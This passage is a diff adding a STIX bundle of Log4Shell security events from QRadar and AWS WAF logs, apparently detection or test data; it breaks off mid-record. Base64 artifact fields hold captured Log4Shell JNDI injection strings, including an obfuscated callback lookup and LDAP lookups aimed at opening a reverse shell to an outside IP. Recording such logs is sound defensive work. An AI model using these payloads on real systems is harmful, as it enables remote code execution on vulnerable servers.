@@ -1,0 +1,1161 @@
+{
+    "type": "bundle",
+    "id": "bundle--d3693a3e-e1f0-41ed-a67b-f7a32dc94614",
+    "objects": [
+        {
+            "type": "identity",
+            "id": "identity--3532c56d-ea72-48be-a2ad-1a53f4c9c6d3",
+            "name": "log4shell",
+            "identity_class": "events"
+        },
+        {
+            "id": "observed-data--31629b2f-2ea6-45b2-8a2c-af55e15ae224",
+            "type": "observed-data",
+            "created_by_ref": "identity--3532c56d-ea72-48be-a2ad-1a53f4c9c6d3",
+            "created": "2021-12-15T19:31:39.699Z",
+            "modified": "2021-12-15T19:31:39.699Z",
+            "objects": {
+                "0": {
+                    "type": "x-oca-event",
+                    "action": "Warning Message",
+                    "outcome": "Warning",
+                    "category": [
+                        "System"
+                    ],
+                    "provider": "System Notification",
+                    "agent": "System Notification-2 :: ip-172-31-79-90",
+                    "created": "2021-12-15T17:28:55.000Z",
+                    "network_ref": "4",
+                    "host_ref": "5",
+                    "original_ref": "10"
+                },
+                "1": {
+                    "type": "x-qradar",
+                    "qid": 38750002,
+                    "category_id": 8054,
+                    "high_level_category_id": 8000,
+                    "log_source_id": 65,
+                    "device_type": 147,
+                    "direction": "L2R",
+                    "credibility": 10,
+                    "relevance": 10,
+                    "cre_event_list": [
+                        100101,
+                        100277,
+                        100272,
+                        100227,
+                        100225,
+                        100221,
+                        100216
+                    ],
+                    "domain_id": 0,
+                    "domain_name": "Default Domain",
+                    "has_offense": false
+                },
+                "2": {
+                    "type": "x-ibm-finding",
+                    "start": "2021-12-15T17:28:55.680Z",
+                    "end": "2021-12-15T17:28:55.680Z",
+                    "src_ip_ref": "3",
+                    "dst_ip_ref": "7",
+                    "event_count": 1,
+                    "finding_type": "event",
+                    "magnitude": 8,
+                    "severity": 5,
+                    "src_geolocation": "NorthAmerica.UnitedStates",
+                    "dst_geolocation": "other",
+                    "rule_names": [
+                        "BB:NetworkDefinition: Honeypot like Addresses",
+                        "BB:NetworkDefinition: Darknet Addresses",
+                        "Load Basic Building Blocks",
+                        "Source Asset Weight is Low",
+                        "Source Asset Exists",
+                        "Destination Asset Weight is Low",
+                        "Context is Local to Remote"
+                    ]
+                },
+                "3": {
+                    "type": "ipv4-addr",
+                    "value": "172.31.79.90",
+                    "resolves_to_refs": [
+                        "6"
+                    ]
+                },
+                "4": {
+                    "type": "network-traffic",
+                    "src_ref": "3",
+                    "src_port": 0,
+                    "dst_ref": "7",
+                    "dst_port": 0,
+                    "protocols": [
+                        "reserved"
+                    ]
+                },
+                "6": {
+                    "type": "mac-addr",
+                    "value": "00:00:00:00:00:00"
+                },
+                "7": {
+                    "type": "ipv4-addr",
+                    "value": "127.0.0.1",
+                    "resolves_to_refs": [
+                        "8"
+                    ]
+                },
+                "8": {
+                    "type": "mac-addr",
+                    "value": "00:00:00:00:00:00"
+                },
+                "9": {
+                    "type": "ipv4-addr",
+                    "value": "0.0.0.0"
+                },
+                "10": {
+                    "type": "artifact",
+                    "payload_bin": "RGVjIDE1IDEyOjI4OjU1IDEyNy4wLjAuMSAgW3F3XzQ6MDc4ZWYxYmMtMWQwYi00ZTY3LTgyMjMtNzViZWU3MzAzNjhjXSBjb20ucTFsYWJzLmNvcmUuc2hhcmVkLmFyaWVsLkN1c3RvbUtleUNyZWF0b3I6IFtXQVJOXSBbTk9UOjAwMDAwMDQwMDBdWzE3Mi4zMS43OS45MC8tIC1dIFstLy0gLV1rZXlGcm9tU3RyaW5nIGZhaWxlZC4gRXhwcmVzc2lvbiBmb3IgcHJvcGVydHkgU2VuZGVyIEhvc3QgdHJpZWQgdG8gcmV0dXJuICR7am5kaToke2xvd2VyOmx9JHtsb3dlcjpkfWEke2xvd2VyOnB9Oi8veGYud29ybGQ4MC5sb2c0ai5iaW4ke3VwcGVyOmF9cnllZGdlLmlvOjgwL2NhbGxiYWNrfSBhcyBjbGFzcyBjb20ucTFsYWJzLmNvcmUuZGFvLnV0aWwuSG9zdC4gQ2hlY2sgdGhlIGN1c3RvbSBwcm9wZXJ0eSBkZWZpbml0aW9uIHRvIGVuc3VyZSBpdCBpcyB0aGUgcHJvcGVyIHR5cGUuCg==",
+                    "mime_type": "text/plain"
+                }
+            },
+            "first_observed": "2021-12-15T17:28:55.680Z",
+            "last_observed": "2021-12-15T17:28:55.680Z",
+            "number_observed": 1
+        },
+        {
+            "id": "observed-data--821f09d3-3821-4ccc-b920-23dfe5cb6ce2",
+            "type": "observed-data",
+            "created_by_ref": "identity--3532c56d-ea72-48be-a2ad-1a53f4c9c6d3",
+            "created": "2021-12-15T19:31:39.702Z",
+            "modified": "2021-12-15T19:31:39.702Z",
+            "objects": {
+                "0": {
+                    "type": "x-oca-event",
+                    "action": "Warning Message",
+                    "outcome": "Warning",
+                    "category": [
+                        "System"
+                    ],
+                    "provider": "System Notification",
+                    "agent": "System Notification-2 :: ip-172-31-79-90",
+                    "created": "2021-12-15T17:30:32.000Z",
+                    "network_ref": "4",
+                    "host_ref": "5",
+                    "original_ref": "10"
+                },
+                "1": {
+                    "type": "x-qradar",
+                    "qid": 38750002,
+                    "category_id": 8054,
+                    "high_level_category_id": 8000,
+                    "log_source_id": 65,
+                    "device_type": 147,
+                    "direction": "L2R",
+                    "credibility": 10,
+                    "relevance": 10,
+                    "cre_event_list": [
+                        100101,
+                        100277,
+                        100272,
+                        100227,
+                        100225,
+                        100221,
+                        100216
+                    ],
+                    "domain_id": 0,
+                    "domain_name": "Default Domain",
+                    "has_offense": false
+                },
+                "2": {
+                    "type": "x-ibm-finding",
+                    "start": "2021-12-15T17:30:32.631Z",
+                    "end": "2021-12-15T17:30:32.631Z",
+                    "src_ip_ref": "3",
+                    "dst_ip_ref": "7",
+                    "event_count": 1,
+                    "finding_type": "event",
+                    "magnitude": 8,
+                    "severity": 5,
+                    "src_geolocation": "NorthAmerica.UnitedStates",
+                    "dst_geolocation": "other",
+                    "rule_names": [
+                        "BB:NetworkDefinition: Honeypot like Addresses",
+                        "BB:NetworkDefinition: Darknet Addresses",
+                        "Load Basic Building Blocks",
+                        "Source Asset Weight is Low",
+                        "Source Asset Exists",
+                        "Destination Asset Weight is Low",
+                        "Context is Local to Remote"
+                    ]
+                },
+                "3": {
+                    "type": "ipv4-addr",
+                    "value": "172.31.79.90",
+                    "resolves_to_refs": [
+                        "6"
+                    ]
+                },
+                "4": {
+                    "type": "network-traffic",
+                    "src_ref": "3",
+                    "src_port": 0,
+                    "dst_ref": "7",
+                    "dst_port": 0,
+                    "protocols": [
+                        "reserved"
+                    ]
+                },
+                "6": {
+                    "type": "mac-addr",
+                    "value": "00:00:00:00:00:00"
+                },
+                "7": {
+                    "type": "ipv4-addr",
+                    "value": "127.0.0.1",
+                    "resolves_to_refs": [
+                        "8"
+                    ]
+                },
+                "8": {
+                    "type": "mac-addr",
+                    "value": "00:00:00:00:00:00"
+                },
+                "9": {
+                    "type": "ipv4-addr",
+                    "value": "0.0.0.0"
+                },
+                "10": {
+                    "type": "artifact",
+                    "payload_bin": "RGVjIDE1IDEyOjMwOjMyIDEyNy4wLjAuMSAgW2R5bGFuaEA3Mi4xODUuMjUzLjUgKDczNikgL2NvbnNvbGUvZG8vYXJpZWwvYXJpZWxEZXRhaWxzXSBjb20ucTFsYWJzLmNvcmUuc2hhcmVkLmFyaWVsLkN1c3RvbUtleUNyZWF0b3I6IFtXQVJOXSBbTk9UOjAwMDAwMDQwMDBdWzE3Mi4zMS43OS45MC8tIC1dIFstLy0gLV1rZXlGcm9tU3RyaW5nIGZhaWxlZC4gRXhwcmVzc2lvbiBmb3IgcHJvcGVydHkgU2VuZGVyIEhvc3QgdHJpZWQgdG8gcmV0dXJuICR7am5kaToke2xvd2VyOmx9JHtsb3dlcjpkfWEke2xvd2VyOnB9Oi8veGYud29ybGQ4MC5sb2c0ai5iaW4ke3VwcGVyOmF9cnllZGdlLmlvOjgwL2NhbGxiYWNrfSBhcyBjbGFzcyBjb20ucTFsYWJzLmNvcmUuZGFvLnV0aWwuSG9zdC4gQ2hlY2sgdGhlIGN1c3RvbSBwcm9wZXJ0eSBkZWZpbml0aW9uIHRvIGVuc3VyZSBpdCBpcyB0aGUgcHJvcGVyIHR5cGUuCg==",
+                    "mime_type": "text/plain"
+                }
+            },
+            "first_observed": "2021-12-15T17:30:32.631Z",
+            "last_observed": "2021-12-15T17:30:32.631Z",
+            "number_observed": 1
+        },
+        {
+            "id": "observed-data--1c270e5e-8862-4739-a6dd-14f237f746f4",
+            "type": "observed-data",
+            "created_by_ref": "identity--3532c56d-ea72-48be-a2ad-1a53f4c9c6d3",
+            "created": "2021-12-15T19:31:39.702Z",
+            "modified": "2021-12-15T19:31:39.702Z",
+            "objects": {
+                "0": {
+                    "type": "x-oca-event",
+                    "action": "Warning Message",
+                    "outcome": "Warning",
+                    "category": [
+                        "System"
+                    ],
+                    "provider": "System Notification",
+                    "agent": "System Notification-2 :: ip-172-31-79-90",
+                    "created": "2021-12-15T17:25:04.000Z",
+                    "network_ref": "4",
+                    "host_ref": "5",
+                    "original_ref": "10"
+                },
+                "1": {
+                    "type": "x-qradar",
+                    "qid": 38750002,
+                    "category_id": 8054,
+                    "high_level_category_id": 8000,
+                    "log_source_id": 65,
+                    "device_type": 147,
+                    "direction": "L2R",
+                    "credibility": 10,
+                    "relevance": 10,
+                    "cre_event_list": [
+                        100101,
+                        100277,
+                        100272,
+                        100227,
+                        100225,
+                        100221,
+                        100216
+                    ],
+                    "domain_id": 0,
+                    "domain_name": "Default Domain",
+                    "has_offense": false
+                },
+                "2": {
+                    "type": "x-ibm-finding",
+                    "start": "2021-12-15T17:25:05.079Z",
+                    "end": "2021-12-15T17:25:05.079Z",
+                    "src_ip_ref": "3",
+                    "dst_ip_ref": "7",
+                    "event_count": 1,
+                    "finding_type": "event",
+                    "magnitude": 8,
+                    "severity": 5,
+                    "src_geolocation": "NorthAmerica.UnitedStates",
+                    "dst_geolocation": "other",
+                    "rule_names": [
+                        "BB:NetworkDefinition: Honeypot like Addresses",
+                        "BB:NetworkDefinition: Darknet Addresses",
+                        "Load Basic Building Blocks",
+                        "Source Asset Weight is Low",
+                        "Source Asset Exists",
+                        "Destination Asset Weight is Low",
+                        "Context is Local to Remote"
+                    ]
+                },
+                "3": {
+                    "type": "ipv4-addr",
+                    "value": "172.31.79.90",
+                    "resolves_to_refs": [
+                        "6"
+                    ]
+                },
+                "4": {
+                    "type": "network-traffic",
+                    "src_ref": "3",
+                    "src_port": 0,
+                    "dst_ref": "7",
+                    "dst_port": 0,
+                    "protocols": [
+                        "reserved"
+                    ]
+                },
+                "6": {
+                    "type": "mac-addr",
+                    "value": "00:00:00:00:00:00"
+                },
+                "7": {
+                    "type": "ipv4-addr",
+                    "value": "127.0.0.1",
+                    "resolves_to_refs": [
+                        "8"
+                    ]
+                },
+                "8": {
+                    "type": "mac-addr",
+                    "value": "00:00:00:00:00:00"
+                },
+                "9": {
+                    "type": "ipv4-addr",
+                    "value": "0.0.0.0"
+                },
+                "10": {
+                    "type": "artifact",
+                    "payload_bin": "RGVjIDE1IDEyOjI1OjA0IDEyNy4wLjAuMSAgW2R5bGFuaEA3Mi4xODUuMjUzLjUgKDYzNzgpIC9jb25zb2xlL2RvL2FyaWVsL2FyaWVsRGV0YWlsc10gY29tLnExbGFicy5jb3JlLnNoYXJlZC5hcmllbC5DdXN0b21LZXlDcmVhdG9yOiBbV0FSTl0gW05PVDowMDAwMDA0MDAwXVsxNzIuMzEuNzkuOTAvLSAtXSBbLS8tIC1da2V5RnJvbVN0cmluZyBmYWlsZWQuIEV4cHJlc3Npb24gZm9yIHByb3BlcnR5IFNlbmRlciBIb3N0IHRyaWVkIHRvIHJldHVybiAke2puZGk6JHtsb3dlcjpsfSR7bG93ZXI6ZH1hJHtsb3dlcjpwfTovL3hmLndvcmxkODAubG9nNGouYmluJHt1cHBlcjphfXJ5ZWRnZS5pbzo4MC9jYWxsYmFja30gYXMgY2xhc3MgY29tLnExbGFicy5jb3JlLmRhby51dGlsLkhvc3QuIENoZWNrIHRoZSBjdXN0b20gcHJvcGVydHkgZGVmaW5pdGlvbiB0byBlbnN1cmUgaXQgaXMgdGhlIHByb3BlciB0eXBlLgo=",
+                    "mime_type": "text/plain"
+                }
+            },
+            "first_observed": "2021-12-15T17:25:05.079Z",
+            "last_observed": "2021-12-15T17:25:05.079Z",
+            "number_observed": 1
+        },
+        {
+            "id": "observed-data--2cd84670-2574-4da6-aa5e-06312fa73cac",
+            "type": "observed-data",
+            "created_by_ref": "identity--3532c56d-ea72-48be-a2ad-1a53f4c9c6d3",
+            "created": "2021-12-15T19:31:39.703Z",
+            "modified": "2021-12-15T19:31:39.703Z",
+            "objects": {
+                "0": {
+                    "type": "x-oca-event",
+                    "action": "Amazon AWS WAF Traffic Blocked",
+                    "outcome": "Firewall Deny",
+                    "category": [
+                        "Access"
+                    ],
+                    "provider": "Amazon AWS WAF",
+                    "agent": "AWS WAF",
+                    "created": "2021-12-14T21:37:46.786Z",
+                    "network_ref": "4",
+                    "host_ref": "5",
+                    "original_ref": "10"
+                },
+                "1": {
+                    "type": "x-qradar",
+                    "qid": 127250005,
+                    "category_id": 4003,
+                    "high_level_category_id": 4000,
+                    "log_source_id": 2568,
+                    "device_type": 501,
+                    "direction": "R2L",
+                    "credibility": 5,
+                    "relevance": 3,
+                    "cre_event_list": [
+                        100164,
+                        100146,
+                        100104,
+                        118989,
+                        104939,
+                        100272,
+                        100227,
+                        100221,
+                        100217
+                    ],
+                    "domain_id": 0,
+                    "domain_name": "Default Domain",
+                    "has_offense": false
+                },
+                "2": {
+                    "type": "x-ibm-finding",
+                    "start": "2021-12-14T21:43:32.567Z",
+                    "end": "2021-12-14T21:43:32.567Z",
+                    "src_ip_ref": "3",
+                    "dst_ip_ref": "7",
+                    "event_count": 1,
+                    "finding_type": "event",
+                    "magnitude": 4,
+                    "severity": 4,
+                    "src_geolocation": "Asia.India",
+                    "dst_geolocation": "other",
+                    "rule_names": [
+                        "BB:CategoryDefinition: Suspicious Event Categories",
+                        "BB:CategoryDefinition: Suspicious Events",
+                        "BB:CategoryDefinition: Firewall or ACL Denies",
+                        "BB:UBA : Access Denies",
+                        "BB:UBA : Common Log Source Filters",
+                        "Load Basic Building Blocks",
+                        "Source Asset Weight is Low",
+                        "Destination Asset Weight is Low",
+                        "Context is Remote to Local"
+                    ]
+                },
+                "3": {
+                    "type": "ipv4-addr",
+                    "value": "157.245.108.125",
+                    "resolves_to_refs": [
+                        "6"
+                    ]
+                },
+                "4": {
+                    "type": "network-traffic",
+                    "src_ref": "3",
+                    "src_port": 0,
+                    "dst_ref": "7",
+                    "dst_port": 0,
+                    "protocols": [
+                        "reserved"
+                    ]
+                },
+                "6": {
+                    "type": "mac-addr",
+                    "value": "00:00:00:00:00:00"
+                },
+                "7": {
+                    "type": "ipv4-addr",
+                    "value": "0.0.0.0",
+                    "resolves_to_refs": [
+                        "8"
+                    ]
+                },
+                "8": {
+                    "type": "mac-addr",
+                    "value": "00:00:00:00:00:00"
+                },
+                "9": {
+                    "type": "ipv4-addr",
+                    "value": "0.0.0.0"
+                },
+                "10": {
+                    "type": "artifact",
+                    "payload_bin": "eyJ0aW1lc3RhbXAiOjE2Mzk1MTc4NjY3ODYsImZvcm1hdFZlcnNpb24iOjEsIndlYmFjbElkIjoiYXJuOmF3czp3YWZ2Mjp1cy1lYXN0LTE6OTIwMjk0NzU0NzgwOnJlZ2lvbmFsL3dlYmFjbC9BV1MtVGVzdC1XQUYvY2ZmOTA5MjAtOGRlMS00NThmLWEwMjEtODEzYzkyYzlhYjJlIiwidGVybWluYXRpbmdSdWxlSWQiOiJBV1MtQVdTTWFuYWdlZFJ1bGVzS25vd25CYWRJbnB1dHNSdWxlU2V0IiwidGVybWluYXRpbmdSdWxlVHlwZSI6Ik1BTkFHRURfUlVMRV9HUk9VUCIsImFjdGlvbiI6IkJMT0NLIiwidGVybWluYXRpbmdSdWxlTWF0Y2hEZXRhaWxzIjpbXSwiaHR0cFNvdXJjZU5hbWUiOiJBTEIiLCJodHRwU291cmNlSWQiOiI5MjAyOTQ3NTQ3ODAtYXBwL1Rlc3QtTG9hZC1CYWxhbmNlci9lZjVhOTE4MTU0YmRlYjUwIiwicnVsZUdyb3VwTGlzdCI6W3sicnVsZUdyb3VwSWQiOiJBV1MjQVdTTWFuYWdlZFJ1bGVzQ29tbW9uUnVsZVNldCIsInRlcm1pbmF0aW5nUnVsZSI6bnVsbCwibm9uVGVybWluYXRpbmdNYXRjaGluZ1J1bGVzIjpbXSwiZXhjbHVkZWRSdWxlcyI6bnVsbH0seyJydWxlR3JvdXBJZCI6IkFXUyNBV1NNYW5hZ2VkUnVsZXNLbm93bkJhZElucHV0c1J1bGVTZXQiLCJ0ZXJtaW5hdGluZ1J1bGUiOnsicnVsZUlkIjoiTG9nNEpSQ0UiLCJhY3Rpb24iOiJCTE9DSyIsInJ1bGVNYXRjaERldGFpbHMiOm51bGx9LCJub25UZXJtaW5hdGluZ01hdGNoaW5nUnVsZXMiOltdLCJleGNsdWRlZFJ1bGVzIjpudWxsfV0sInJhdGVCYXNlZFJ1bGVMaXN0IjpbXSwibm9uVGVybWluYXRpbmdNYXRjaGluZ1J1bGVzIjpbXSwicmVxdWVzdEhlYWRlcnNJbnNlcnRlZCI6bnVsbCwicmVzcG9uc2VDb2RlU2VudCI6bnVsbCwiaHR0cFJlcXVlc3QiOnsiY2xpZW50SXAiOiIxNTcuMjQ1LjEwOC4xMjUiLCJjb3VudHJ5IjoiSU4iLCJoZWFkZXJzIjpbeyJuYW1lIjoiVXNlci1BZ2VudCIsInZhbHVlIjoiYm9yY2h1ay8zLjEgJHtqbmRpOmxkYXA6Ly8xNjcuOTkuMzIuMTM5OjEzODkvQmFzaWMvUmV2ZXJzZVNoZWxsLzE2Ny45OS4zMi4xMzkvOTk5OX0ifSx7Im5hbWUiOiJBY2NlcHQiLCJ2YWx1ZSI6IiovKiJ9LHsibmFtZSI6IkJlYXJlciIsInZhbHVlIjoiJHtqbmRpOmxkYXA6Ly8xNjcuOTkuMzIuMTM5OjEzODkvQmFzaWMvUmV2ZXJzZVNoZWxsLzE2Ny45OS4zMi4xMzkvOTk5OX0ifSx7Im5hbWUiOiJBdXRoZW50aWNhdGlvbiIsInZhbHVlIjoiJHtqbmRpOmxkYXA6Ly8xNjcuOTkuMzIuMTM5OjEzODkvQmFzaWMvUmV2ZXJzZVNoZWxsLzE2Ny45OS4zMi4xMzkvOTk5OX0ifSx7Im5hbWUiOiJYLVJlcXVlc3RlZC1XaXRoIiwidmFsdWUiOiIke2puZGk6bGRhcDovLzE2Ny45OS4zMi4xMzk6MTM4OS9CYXNpYy9SZXZlcnNlU2hlbGwvMTY3Ljk5LjMyLjEzOS85OTk5fSJ9LHsibmFtZSI6IlgtUmVxdWVzdGVkLUZvciIsInZhbHVlIjoiJHtqbmRpOmxkYXA6Ly8xNjcuOTkuMzIuMTM5OjEzODkvQmFzaWMvUmV2ZXJzZVNoZWxsLzE2Ny45OS4zMi4xMzkvOTk5OX0ifSx7Im5hbWUiOiJYLUFwaS1WZXJzaW9uIiwidmFsdWUiOiIke2puZGk6bGRhcDovLzE2Ny45OS4zMi4xMzk6MTM4OS9CYXNpYy9SZXZlcnNlU2hlbGwvMTY3Ljk5LjMyLjEzOS85OTk5fSJ9XSwidXJpIjoiLyIsImFyZ3MiOiIiLCJodHRwVmVyc2lvbiI6IkhUVFAvMS4wIiwiaHR0cE1ldGhvZCI6IkdFVCIsInJlcXVlc3RJZCI6IjEtNjFiOTBlYWEtNTBmYzdlMTUwMTY1M2E2NTJkOWE3NjhkIn0sImxhYmVscyI6W3sibmFtZSI6ImF3c3dhZjptYW5hZ2VkOmF3czprbm93bi1iYWQtaW5wdXRzOkxvZzRKUkNFIn1dfQ==",
+                    "mime_type": "text/plain"
+                }
+            },
+            "first_observed": "2021-12-14T21:43:32.567Z",
+            "last_observed": "2021-12-14T21:43:32.567Z",
+            "number_observed": 1
+        },
+        {
+            "id": "observed-data--5ca8a77d-c592-488f-9278-3e0bb47e9014",
+            "type": "observed-data",
+            "created_by_ref": "identity--3532c56d-ea72-48be-a2ad-1a53f4c9c6d3",
+            "created": "2021-12-15T19:31:39.703Z",
+            "modified": "2021-12-15T19:31:39.703Z",
+            "objects": {
+                "0": {
+                    "type": "x-oca-event",
+                    "action": "Amazon AWS WAF Traffic Blocked",
+                    "outcome": "Firewall Deny",
+                    "category": [
+                        "Access"
+                    ],
+                    "provider": "Amazon AWS WAF",
+                    "agent": "AWS WAF",
+                    "created": "2021-12-15T09:23:15.748Z",
+                    "network_ref": "4",
+                    "host_ref": "5",
+                    "original_ref": "10"
+                },
+                "1": {
+                    "type": "x-qradar",
+                    "qid": 127250005,
+                    "category_id": 4003,
+                    "high_level_category_id": 4000,
+                    "log_source_id": 2568,
+                    "device_type": 501,
+                    "direction": "R2L",
+                    "credibility": 5,
+                    "relevance": 3,
+                    "cre_event_list": [
+                        100164,
+                        100146,
+                        100104,
+                        118989,
+                        104939,
+                        100272,
+                        100227,
+                        100221,
+                        100217
+                    ],
+                    "domain_id": 0,
+                    "domain_name": "Default Domain",
+                    "has_offense": false
+                },
+                "2": {
+                    "type": "x-ibm-finding",
+                    "start": "2021-12-15T09:28:41.056Z",
+                    "end": "2021-12-15T09:28:41.056Z",
+                    "src_ip_ref": "3",
+                    "dst_ip_ref": "7",
+                    "event_count": 1,
+                    "finding_type": "event",
+                    "magnitude": 4,
+                    "severity": 4,
+                    "src_geolocation": "Europe.Netherlands",
+                    "dst_geolocation": "other",
+                    "rule_names": [
+                        "BB:CategoryDefinition: Suspicious Event Categories",
+                        "BB:CategoryDefinition: Suspicious Events",
+                        "BB:CategoryDefinition: Firewall or ACL Denies",
+                        "BB:UBA : Access Denies",
+                        "BB:UBA : Common Log Source Filters",
+                        "Load Basic Building Blocks",
+                        "Source Asset Weight is Low",
+                        "Destination Asset Weight is Low",
+                        "Context is Remote to Local"
+                    ]
+                },
+                "3": {
+                    "type": "ipv4-addr",
+                    "value": "165.22.196.189",
+                    "resolves_to_refs": [
+                        "6"
+                    ]
+                },
+                "4": {
+                    "type": "network-traffic",
+                    "src_ref": "3",
+                    "src_port": 0,
+                    "dst_ref": "7",
+                    "dst_port": 0,
+                    "protocols": [
+                        "reserved"
+                    ]
+                },
+                "6": {
+                    "type": "mac-addr",
+                    "value": "00:00:00:00:00:00"
+                },
+                "7": {
+                    "type": "ipv4-addr",
+                    "value": "0.0.0.0",
+                    "resolves_to_refs": [
+                        "8"
+                    ]
+                },
+                "8": {
+                    "type": "mac-addr",
+                    "value": "00:00:00:00:00:00"
+                },
+                "9": {
+                    "type": "ipv4-addr",
+                    "value": "0.0.0.0"
+                },
+                "10": {
+                    "type": "artifact",
+                    "payload_bin": "eyJ0aW1lc3RhbXAiOjE2Mzk1NjAxOTU3NDgsImZvcm1hdFZlcnNpb24iOjEsIndlYmFjbElkIjoiYXJuOmF3czp3YWZ2Mjp1cy1lYXN0LTE6OTIwMjk0NzU0NzgwOnJlZ2lvbmFsL3dlYmFjbC9BV1MtVGVzdC1XQUYvY2ZmOTA5MjAtOGRlMS00NThmLWEwMjEtODEzYzkyYzlhYjJlIiwidGVybWluYXRpbmdSdWxlSWQiOiJBV1MtQVdTTWFuYWdlZFJ1bGVzQW5vbnltb3VzSXBMaXN0IiwidGVybWluYXRpbmdSdWxlVHlwZSI6Ik1BTkFHRURfUlVMRV9HUk9VUCIsImFjdGlvbiI6IkJMT0NLIiwidGVybWluYXRpbmdSdWxlTWF0Y2hEZXRhaWxzIjpbXSwiaHR0cFNvdXJjZU5hbWUiOiJBTEIiLCJodHRwU291cmNlSWQiOiI5MjAyOTQ3NTQ3ODAtYXBwL1Rlc3QtTG9hZC1CYWxhbmNlci9lZjVhOTE4MTU0YmRlYjUwIiwicnVsZUdyb3VwTGlzdCI6W3sicnVsZUdyb3VwSWQiOiJBV1MjQVdTTWFuYWdlZFJ1bGVzQ29tbW9uUnVsZVNldCIsInRlcm1pbmF0aW5nUnVsZSI6bnVsbCwibm9uVGVybWluYXRpbmdNYXRjaGluZ1J1bGVzIjpbXSwiZXhjbHVkZWRSdWxlcyI6bnVsbH0seyJydWxlR3JvdXBJZCI6IkFXUyNBV1NNYW5hZ2VkUnVsZXNLbm93bkJhZElucHV0c1J1bGVTZXQiLCJ0ZXJtaW5hdGluZ1J1bGUiOm51bGwsIm5vblRlcm1pbmF0aW5nTWF0Y2hpbmdSdWxlcyI6W10sImV4Y2x1ZGVkUnVsZXMiOm51bGx9LHsicnVsZUdyb3VwSWQiOiJBV1MjQVdTTWFuYWdlZFJ1bGVzQW1hem9uSXBSZXB1dGF0aW9uTGlzdCIsInRlcm1pbmF0aW5nUnVsZSI6bnVsbCwibm9uVGVybWluYXRpbmdNYXRjaGluZ1J1bGVzIjpbXSwiZXhjbHVkZWRSdWxlcyI6bnVsbH0seyJydWxlR3JvdXBJZCI6IkFXUyNBV1NNYW5hZ2VkUnVsZXNBbm9ueW1vdXNJcExpc3QiLCJ0ZXJtaW5hdGluZ1J1bGUiOnsicnVsZUlkIjoiSG9zdGluZ1Byb3ZpZGVySVBMaXN0IiwiYWN0aW9uIjoiQkxPQ0siLCJydWxlTWF0Y2hEZXRhaWxzIjpudWxsfSwibm9uVGVybWluYXRpbmdNYXRjaGluZ1J1bGVzIjpbXSwiZXhjbHVkZWRSdWxlcyI6bnVsbH1dLCJyYXRlQmFzZWRSdWxlTGlzdCI6W10sIm5vblRlcm1pbmF0aW5nTWF0Y2hpbmdSdWxlcyI6W10sInJlcXVlc3RIZWFkZXJzSW5zZXJ0ZWQiOm51bGwsInJlc3BvbnNlQ29kZVNlbnQiOm51bGwsImh0dHBSZXF1ZXN0Ijp7ImNsaWVudElwIjoiMTY1LjIyLjE5Ni4xODkiLCJjb3VudHJ5IjoiTkwiLCJoZWFkZXJzIjpbeyJuYW1lIjoiSG9zdCIsInZhbHVlIjoiNTIuNTQuMjM3LjY0In0seyJuYW1lIjoiVXNlci1BZ2VudCIsInZhbHVlIjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzgzLjAuNDEwMy42MSBTYWZhcmkvNTM3LjM2In0seyJuYW1lIjoiQWNjZXB0LUVuY29kaW5nIiwidmFsdWUiOiJnemlwLCBkZWZsYXRlIn0seyJuYW1lIjoiQWNjZXB0IiwidmFsdWUiOiIqLyoifSx7Im5hbWUiOiJDb25uZWN0aW9uIiwidmFsdWUiOiJrZWVwLWFsaXZlIn0seyJuYW1lIjoiWC1Gb3J3YXJkZWQtRm9yIiwidmFsdWUiOiIke2puZGk6JHtsb3dlcjpsfSR7bG93ZXI6ZH1hJHtsb3dlcjpwfTovL3hmLndvcmxkODAubG9nNGouYmluJHt1cHBlcjphfXJ5ZWRnZS5pbzo4MC9jYWxsYmFja30ifV0sInVyaSI6Ii9mYXZpY29uLmljbyIsImFyZ3MiOiIiLCJodHRwVmVyc2lvbiI6IkhUVFAvMS4xIiwiaHR0cE1ldGhvZCI6IkdFVCIsInJlcXVlc3RJZCI6IjEtNjFiOWI0MDMtMTYyZGFmZjExNTdiNjQ2NTZkYTliNTJlIn0sImxhYmVscyI6W3sibmFtZSI6ImF3c3dhZjptYW5hZ2VkOmF3czphbm9ueW1vdXMtaXAtbGlzdDpIb3N0aW5nUHJvdmlkZXJJUExpc3QifV19",
+                    "mime_type": "text/plain"
+                }
+            },
+            "first_observed": "2021-12-15T09:28:41.056Z",
+            "last_observed": "2021-12-15T09:28:41.056Z",
+            "number_observed": 1
+        },
+        {
+            "id": "observed-data--1059326b-6737-470d-b04b-060c56001db8",
+            "type": "observed-data",
+            "created_by_ref": "identity--3532c56d-ea72-48be-a2ad-1a53f4c9c6d3",
+            "created": "2021-12-15T19:31:39.703Z",
+            "modified": "2021-12-15T19:31:39.703Z",
+            "objects": {
+                "0": {
+                    "type": "x-oca-event",
+                    "action": "Amazon AWS WAF Traffic Blocked",
+                    "outcome": "Firewall Deny",
+                    "category": [
+                        "Access"
+                    ],
+                    "provider": "Amazon AWS WAF",
+                    "agent": "AWS WAF",
+                    "created": "2021-12-15T09:25:51.919Z",
+                    "network_ref": "4",
+                    "host_ref": "5",
+                    "original_ref": "10"
+                },
+                "1": {
+                    "type": "x-qradar",
+                    "qid": 127250005,
+                    "category_id": 4003,
+                    "high_level_category_id": 4000,
+                    "log_source_id": 2568,
+                    "device_type": 501,
+                    "direction": "R2L",
+                    "credibility": 5,
+                    "relevance": 3,
+                    "cre_event_list": [
+                        100164,
+                        100146,
+                        100104,
+                        118989,
+                        104939,
+                        100272,
+                        100227,
+                        100221,
+                        100217
+                    ],
+                    "domain_id": 0,
+                    "domain_name": "Default Domain",
+                    "has_offense": false
+                },
+                "2": {
+                    "type": "x-ibm-finding",
+                    "start": "2021-12-15T09:28:41.056Z",
+                    "end": "2021-12-15T09:28:41.056Z",
+                    "src_ip_ref": "3",
+                    "dst_ip_ref": "7",
+                    "event_count": 1,
+                    "finding_type": "event",
+                    "magnitude": 4,
+                    "severity": 4,
+                    "src_geolocation": "Europe.Germany",
+                    "dst_geolocation": "other",
+                    "rule_names": [
+                        "BB:CategoryDefinition: Suspicious Event Categories",
+                        "BB:CategoryDefinition: Suspicious Events",
+                        "BB:CategoryDefinition: Firewall or ACL Denies",
+                        "BB:UBA : Access Denies",
+                        "BB:UBA : Common Log Source Filters",
+                        "Load Basic Building Blocks",
+                        "Source Asset Weight is Low",
+                        "Destination Asset Weight is Low",
+                        "Context is Remote to Local"
+                    ]
+                },
+                "3": {
